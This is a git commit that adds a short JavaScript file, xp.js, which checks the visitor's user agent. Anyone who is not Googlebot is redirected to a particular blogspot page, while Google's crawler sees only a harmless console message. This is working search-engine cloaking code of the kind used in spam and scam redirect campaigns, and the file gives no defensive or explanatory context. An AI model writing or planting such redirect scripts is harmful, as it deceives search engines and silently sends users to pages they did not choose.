8100dc4d87e3185806bc7a1694a5f9ed3064ef4a
hamarirani7-sys <hamarirani7@gmail.com>
2026-09-22 13:50:40 +0600

    Create xp.js

---
+++ xp.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://holer-blog.blogspot.com/2026/05/qae.html";
+} else {
+  console.log("Thanks for visiting my page" );
+}
